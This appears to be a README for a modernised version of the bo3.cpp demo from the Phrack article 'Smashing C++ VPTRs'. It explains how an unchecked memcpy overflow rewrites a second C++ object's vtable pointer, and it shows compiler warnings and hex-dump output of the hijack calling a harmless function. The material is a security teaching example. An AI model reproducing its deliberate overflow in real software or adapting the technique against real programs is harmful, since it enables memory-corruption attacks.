# bo3.cpp from Rix's Smashing C++ VPTRs, Phrack 56:8
## Updated for modern g++ by evm

In May, 2000, rix published a follow-on to the classic Smashing the Stack for Fun and Profit by Aleph One, entitled Smashing C++ VPTRs.  Multiple types of vulnerabilities and exploits were presented, most having to do with the fact that C++ can allocate objects on the stack and is then forced to used function tables located on the stack, which can be overwritten.

In order to explore some things I updated his bo3.cpp example to work with modern g++.  The main updates are:

- Changing from 32-bit pointers to 64-bit pointers
- Use a protocol parsing unchecked size/memcpy vuln (rix used a strcpy vuln and relied on there being no 0x00 bytes in his pointers, which doesn't work on 64-bit)
- Exploit directly calls a function vs. using stack-based shellcode (this is cheating a bit, but possible if the location of the function can be determined)
- g++ now puts the VPTR at the beginning of the object instead of the end, so we overflow into a 2nd object's VPTR

Comments are provided to walk through what's going on.  A "debug" option is provided to hex dump some of the intermediate buffers.  Compiling & running should work as follows:

```
evm@pickles:~$ g++ bo3.cpp -o bo3
bo3.cpp: In function ‘int main()’:
bo3.cpp:119:8: warning: ‘void* __builtin_memcpy(void*, const void*, long unsigned int)’ writing 8 bytes into a region of size 7 overflows the destination [-Wstringop-overflow=]
  strcpy((char *)(msg2 + sizeof(qword)), "string2");
  ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evm@pickles:~$
evm@pickles:~$ g++ bo3.cpp -DDEBUG -o bo3-dbg
bo3.cpp: In function ‘int main()’:
bo3.cpp:109:43: warning: ISO C++ forbids converting a string constant to ‘char*’ [-Wwrite-strings]
  objects_hex_print(Object, "initial setup");
                                           ^
bo3.cpp:114:44: warning: ISO C++ forbids converting a string constant to ‘char*’ [-Wwrite-strings]
  objects_hex_print(Object, "after overflow");
                                            ^
bo3.cpp:119:8: warning: ‘void* __builtin_memcpy(void*, const void*, long unsigned int)’ writing 8 bytes into a region of size 7 overflows the destination [-Wstringop-overflow=]
  strcpy((char *)(msg2 + sizeof(qword)), "string2");
  ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evm@pickles:~$
evm@pickles:~$ ./bo3
MyClass1: ��
U
never gonna give you up!
evm@pickles:~$
evm@pickles:~$ ./bo3-dbg 
Object[0] (initial setup) at: 00005578d26b4e70
00005578D26B4E70: 28 1D 63 D1 78 55 00 00 00 00 00 00 00 00 00 00   00005578D1631D28 0000000000000000
00005578D26B4E80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B4E90: 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00   0000000000000000 0000000000000031
Object[1] (initial setup) at: 00005578d26b4ea0
00005578D26B4EA0: 10 1D 63 D1 78 55 00 00 00 00 00 00 00 00 00 00   00005578D1631D10 0000000000000000
00005578D26B4EB0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B4EC0: 00 00 00 00 00 00 00 00 11 04 00 00 00 00 00 00   0000000000000000 0000000000000411
Buffer at: 00005578d26b52e0
00005578D26B52E0: 38 00 00 00 00 00 00 00 C3 0B 43 D1 78 55 00 00   0000000000000038 00005578D1430BC3
00005578D26B52F0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B5300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B5310: E8 52 6B D2 78 55 00 00 00 00 00 00 00 00 00 00   00005578D26B52E8 0000000000000000
Object[0] (after overflow) at: 00005578d26b4e70
00005578D26B4E70: 28 1D 63 D1 78 55 00 00 C3 0B 43 D1 78 55 00 00   00005578D1631D28 00005578D1430BC3
00005578D26B4E80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B4E90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
Object[1] (after overflow) at: 00005578d26b4ea0
00005578D26B4EA0: E8 52 6B D2 78 55 00 00 00 00 00 00 00 00 00 00   00005578D26B52E8 0000000000000000
00005578D26B4EB0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0000000000000000 0000000000000000
00005578D26B4EC0: 00 00 00 00 00 00 00 00 11 04 00 00 00 00 00 00   0000000000000000 0000000000000411
MyClass1: �
           C�xU
never gonna give you up!
```
